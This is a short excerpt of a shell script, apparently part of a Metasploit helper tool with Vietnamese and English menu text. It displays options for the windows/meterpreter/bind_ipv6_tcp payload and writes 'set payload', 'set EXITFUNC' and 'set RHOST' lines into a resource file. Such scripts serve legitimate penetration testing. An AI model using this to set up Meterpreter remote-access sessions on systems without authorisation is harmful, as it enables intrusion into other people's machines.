...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/bind_ipv6_tcp):
...
no="     no "
cat << !
Payload options (windows/meterpreter/bind_ipv6_tcp):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/bind_ipv6_tcp" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set RHOST $rhost" >> $rc_file
	paylo="windows/meterpreter/bind_ipv6_tcp"
	lport=$lport
}
